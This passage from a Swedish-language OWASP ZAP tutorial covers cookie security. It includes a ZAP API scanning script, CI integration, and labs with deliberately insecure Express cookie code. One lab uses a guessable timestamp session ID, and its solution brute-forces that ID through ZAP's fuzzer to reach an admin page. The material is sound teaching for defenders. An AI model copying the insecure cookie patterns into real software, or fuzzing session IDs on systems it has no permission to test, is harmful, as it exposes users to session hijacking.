    print("[*] Spidering target...")
    scan_id = zap_api('spider/action/scan', {'url': TARGET})['scan']

    while int(zap_api('spider/view/status', {'scanId': scan_id})['status']) < 100:
        print(f"    Spider progress: {zap_api('spider/view/status', {'scanId': scan_id})['status']}%")
        time.sleep(2)

    print("[+] Spider complete")

    # 3. Passive scan (automatic on spider)
    print("[*] Waiting for passive scan...")
    while int(zap_api('pscan/view/recordsToScan')['recordsToScan']) > 0:
        print(f"    Records to scan: {zap_api('pscan/view/recordsToScan')['recordsToScan']}")
        time.sleep(2)

    print("[+] Passive scan complete")

    # 4. Get cookie-related alerts
    print("\n[*] Cookie Security Issues Found:")
    alerts = zap_api('core/view/alerts', {'baseurl': TARGET})

    cookie_alerts = [a for a in alerts['alerts'] if 'cookie' in a['alert'].lower()]

    if not cookie_alerts:
        print("[+] No cookie security issues found!")
        return

    for alert in cookie_alerts:
        print(f"\n{'='*60}")
        print(f"🔴 {alert['alert']}")
        print(f"Risk: {alert['risk']} | Confidence: {alert['confidence']}")
        print(f"URL: {alert['url']}")
        print(f"Description: {alert['description'][:200]}...")
        print(f"Solution: {alert['solution'][:200]}...")

    # 5. Generate HTML report
    print("\n[*] Generating report...")
    report = zap_api('core/other/htmlreport')

    with open('cookie_security_report.html', 'wb') as f:
        f.write(report.encode('utf-8'))

    print("[+] Report saved to cookie_security_report.html")

    # 6. Summary
    print(f"\n{'='*60}")
    print("SUMMARY")
    print(f"{'='*60}")
    print(f"Total alerts: {len(alerts['alerts'])}")
    print(f"Cookie-related: {len(cookie_alerts)}")

    # Count by risk
    risks = {}
    for alert in cookie_alerts:
        risk = alert['risk']
        risks[risk] = risks.get(risk, 0) + 1

    for risk, count in risks.items():
        print(f"{risk}: {count}")

if __name__ == '__main__':
    main()
```

**Run script:**

```bash
python3 cookie_security_scan.py

# Output:
[*] Starting Cookie Security Scan
[*] Accessing target: http://localhost:3000
[*] Spidering target...
    Spider progress: 23%
    Spider progress: 56%
    Spider progress: 100%
[+] Spider complete
[*] Waiting for passive scan...
    Records to scan: 42
    Records to scan: 0
[+] Passive scan complete

[*] Cookie Security Issues Found:

============================================================
🔴 Cookie No HttpOnly Flag
Risk: Low | Confidence: Medium
URL: http://localhost:3000/login-bad
Description: A cookie has been set without the HttpOnly flag, which means that the cookie can be accessed by JavaScript...
Solution: Ensure that the HttpOnly flag is set for all cookies...

============================================================
🔴 Cookie Without Secure Flag
Risk: Low | Confidence: Medium
URL: http://localhost:3000/login-bad
Description: A cookie has been set without the secure flag...
Solution: Set the Secure flag on all cookies...

[*] Generating report...
[+] Report saved to cookie_security_report.html

============================================================
SUMMARY
============================================================
Total alerts: 15
Cookie-related: 3
Low: 3
```

#### 6.6.3 CI/CD Integration

**GitHub Actions example:**

```yaml
# .github/workflows/security-scan.yml
name: Security Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  zap-scan:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3

    - name: Start application
      run: |
        docker-compose up -d
        sleep 10  # Wait for app to start

    - name: ZAP Cookie Scan
      run: |
        docker run -v $(pwd):/zap/wrk/:rw \
          -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
          -t http://host.docker.internal:3000 \
          -r cookie_scan_report.html \
          -c cookie-scan-rules.conf

    - name: Upload results
      uses: actions/upload-artifact@v3
      with:
        name: zap-report
        path: cookie_scan_report.html

    - name: Check for High risks
      run: |
        if grep -q "Risk: High" cookie_scan_report.html; then
          echo "High risk vulnerabilities found!"
          exit 1
        fi
```

**cookie-scan-rules.conf:**

```
# Enable cookie-specific scanners
10010  # Cookie No HttpOnly Flag
10011  # Cookie Without Secure Flag
10054  # Cookie Without SameSite Attribute
90033  # Loosely Scoped Cookie

# Set alert thresholds
-config rules.cookie.level=LOW
```

---

### 6.7 Praktiska Labs

#### Lab 1: Find and Fix Cookie Vulnerabilities

**Mål:** Hitta och fixa alla cookie-sårbarheter i en app.

**Setup:**

```javascript
// lab1-app.js
const express = require('express');
const app = express();

// Challenge 1: Find the vulnerability
app.get('/challenge1', (req, res) => {
  res.cookie('session', 'user123', {
    maxAge: 3600000
  });
  res.send('Challenge 1');
});

// Challenge 2: Find the vulnerability
app.get('/challenge2', (req, res) => {
  res.cookie('remember_me', 'true', {
    domain: '.example.com',
    maxAge: 30 * 24 * 60 * 60 * 1000
  });
  res.send('Challenge 2');
});

// Challenge 3: Find the vulnerability
app.get('/challenge3', (req, res) => {
  const userData = req.query.data;
  res.cookie('user_data', userData, {
    httpOnly: true,
    secure: true
  });
  res.send('Challenge 3');
});

app.listen(3001, () => console.log('Lab running on :3001'));
```

**Uppgifter:**

1. **Scan med ZAP:** Hitta alla sårbarheter
2. **Identifiera:** Vad är fel med varje challenge?
3. **Fixa:** Skriv säker version
4. **Verifiera:** Scan igen, inga alerts

<details>
<summary><strong>Lösning</strong></summary>

**Challenge 1 Problem:**
- ❌ Ingen `HttpOnly`
- ❌ Ingen `Secure`
- ❌ Ingen `SameSite`

**Fix:**
```javascript
res.cookie('session', 'user123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
});
```

**Challenge 2 Problem:**
- ❌ Loosely scoped (`.example.com` → alla subdomäner)
- ❌ Lång livstid (30 dagar för remember-me är OK, men saknar security flags)

**Fix:**
```javascript
res.cookie('__Host-remember_me', 'true', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  path: '/',
  // NO Domain!
  maxAge: 30 * 24 * 60 * 60 * 1000
});
```

**Challenge 3 Problem:**
- ❌ Inga input validation! `req.query.data` kan innehålla XSS
- Cookie name är inte prefix-protected

**Fix:**
```javascript
const userData = req.query.data;

// Validate input
if (!userData || userData.length > 100 || !/^[a-zA-Z0-9]+$/.test(userData)) {
  return res.status(400).send('Invalid data');
}

res.cookie('__Host-user_data', userData, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  path: '/'
});
```

</details>

---

#### Lab 2: Cookie Fuzzing Challenge

**Mål:** Hitta ett giltigt session-ID genom fuzzing.

**Setup:**

```javascript
// lab2-app.js - Weak session ID generation
const express = require('express');
const app = express();

// Weak PRNG - använder bara timestamp
const sessions = new Set();
for (let i = 0; i < 100; i++) {
  const timestamp = Date.now() - Math.floor(Math.random() * 86400000); // Last 24h
  const weakSessionId = `sess_${timestamp}`;
  sessions.add(weakSessionId);
}

app.get('/admin', (req, res) => {
  const sessionId = req.cookies.session;

  if (sessions.has(sessionId)) {
    res.send('🎉 ADMIN ACCESS GRANTED! Flag: CTF{weak_session_ids_are_bad}');
  } else {
    res.status(401).send('Unauthorized');
  }
});

app.listen(3002);
```

**Uppgift:**

Använd ZAP Fuzzer för att hitta ett giltigt session ID.

<details>
<summary><strong>Lösning</strong></summary>

**Steg 1: Analysera pattern**

Session IDs är i format: `sess_<timestamp>`

**Steg 2: Fuzzing i ZAP**

```
1. Gör request till /admin med dummy cookie:
   Cookie: session=sess_0

2. Högerklicka → Fuzz

3. Highlight "0" → Add Payload

4. Type: Numberzz
   From: [nuvarande timestamp - 86400000]  // 24h sedan
   To: [nuvarande timestamp]
   Increment: 1000  // Test varje sekund

5. Start Fuzzer

6. Leta efter 200 response!
```

**Resultat:**
```
Payload: sess_1700000000000 → 200 OK
Response: 🎉 ADMIN ACCESS GRANTED!
```

**Lärdomar:**
- ❌ Predictable session IDs är kritisk sårbarhet
- ✅ Använd crypto.randomBytes() istället
- ✅ Minst 128 bitar entropy

</details>

---

### 6.8 Rapportering

#### 6.8.1 Generera HTML Report

```
ZAP → Report → Generate HTML Report

Report innehåller:
- Executive Summary
- Alert Details (grupperade per risk level)
- Remediation advice
- Appendix med methodology

Spara som: cookie_security_report.html
```

#### 6.8.2 Custom Report Template

För professionella rapporter, skapa egen template:

```python
import json
from jinja2 import Template

# Get alerts från ZAP API
alerts = zap_api('core/view/alerts', {'baseurl': TARGET})

# Template
report_template = """
<!DOCTYPE html>
<html>
<head>
  <title>Cookie Security Report</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; }
    .high { background: #ff4444; color: white; padding: 10px; }
    .medium { background: #ff9944; color: white; padding: 10px; }
    .low { background: #ffff44; padding: 10px; }
    table { width: 100%; border-collapse: collapse; }
    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
  </style>
</head>
<body>
  <h1>🍪 Cookie Security Assessment Report</h1>
  <p><strong>Target:</strong> {{ target }}</p>
  <p><strong>Date:</strong> {{ date }}</p>

  <h2>Executive Summary</h2>
  <p>Total Alerts: {{ total_alerts }}</p>
  <ul>
    <li>High: {{ high_count }}</li>
    <li>Medium: {{ medium_count }}</li>
    <li>Low: {{ low_count }}</li>
  </ul>

  <h2>Cookie-Specific Findings</h2>
  <table>
    <tr>
      <th>Risk</th>
      <th>Alert</th>
      <th>URL</th>
      <th>Cookie</th>
    </tr>
    {% for alert in cookie_alerts %}
    <tr class="{{ alert.risk|lower }}">
      <td>{{ alert.risk }}</td>
      <td>{{ alert.alert }}</td>
      <td>{{ alert.url }}</td>
      <td><code>{{ alert.evidence }}</code></td>
    </tr>
    {% endfor %}
  </table>

  <h2>Recommendations</h2>
  <ol>
    <li>Set HttpOnly flag on all session cookies</li>
    <li>Set Secure flag on all cookies (HTTPS required)</li>
    <li>Implement SameSite=Strict or Lax</li>
    <li>Use __Host- prefix for critical cookies</li>
    <li>Implement proper session regeneration on login</li>
  </ol>
</body>
</html>
"""

# Render
template = Template(report_template)
html = template.render(
    target=TARGET,
    date=datetime.now().strftime('%Y-%m-%d'),
    total_alerts=len(alerts['alerts']),
    high_count=len([a for a in alerts['alerts'] if a['risk'] == 'High']),
    medium_count=len([a for a in alerts['alerts'] if a['risk'] == 'Medium']),
    low_count=len([a for a in alerts['alerts'] if a['risk'] == 'Low']),
    cookie_alerts=[a for a in alerts['alerts'] if 'cookie' in a['alert'].lower()]
)

with open('professional_cookie_report.html', 'w') as f:
    f.write(html)
```

---

### 6.9 Best Practices för ZAP Cookie Testing

**✅ DO:**

1. **Test i safe miljö först**
   - Använd lokal dev environment
   - Eller dedicated test server
   - ALDRIG direkt på production

2. **Använd både passive och active scans**
   - Passive för snabb analys
   - Active för djup penetration testing

3. **Automatisera i CI/CD**
   - ZAP baseline scan på varje commit
   - Blocka deploy om High-risk sårbarheter hittas

4. **Kombinera med andra verktyg**
   - Burp Suite för manuell testing
   - SQLMap för SQL injection
   - XSStrike för XSS

5. **Dokumentera findings**
   - Generera rapporter
   - Inkludera proof-of-concept
   - Remediation steps

**❌ DON'T:**

1. **Scanna sites du inte äger** utan explicit tillstånd
2. **Köra aggressive scans på production** (kan orsaka DoS)
3. **Ignorera false positives** (verifiera alltid manuellt)
4. **Lita blint på automated results** (manual review krävs)
5. **Skippa rapportering** (ingen fix utan dokumentation)

---

### 6.10 Sammanfattning: ZAP Cookie Testing

**Du har nu lärt dig:**

✅ Installera och konfigurera OWASP ZAP
✅ Passive scanning för cookie flags (HttpOnly, Secure, SameSite)
✅ Active scanning för cookie vulnerabilities
✅ Manuell intercepting och modifiering av cookies
✅ Fuzzing för att hitta weak session IDs
✅ Automatisering med ZAP API
✅ CI/CD integration
✅ Professionell rapportering

**ZAP Cookie Scanners Summary:**

| Scanner | Risk | Vad det testar |
|---------|------|----------------|
| Cookie No HttpOnly Flag | Low | HttpOnly attribute saknas |
| Cookie Without Secure Flag | Low | Secure attribute saknas |
| Cookie Without SameSite | Low | SameSite attribute saknas |
| Cookie Loosely Scoped | Low | Domain satt till `.example.com` |
| Cookie Poisoning | High | XSS/SQLi i cookie values |
| Session Fixation | High | Session ID inte regenererat vid login |

**Nästa steg:**

1. **Praktisera:** Scanna dina egna projekt med ZAP
2. **Fördjupa:** Läs [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
3. **Certifiering:** Överväg OSCP eller CEH för professionell pentesting
4. **Bug Bounty:** Använd ZAP för att hitta sårbarheter på HackerOne/Bugcrowd

**Kom ihåg:** Med stor makt följer stort ansvar. Använd ZAP etiskt och endast på system du har tillstånd att testa!

---
**Guide skriven:** 2025
**Författare:** AI-genererad med senaste info från 2024-2025
**Licensiering:** Fri att använda för utbildningsändamål
**Feedback:** Om du hittar fel eller har förslag, vänligen rapportera!

---
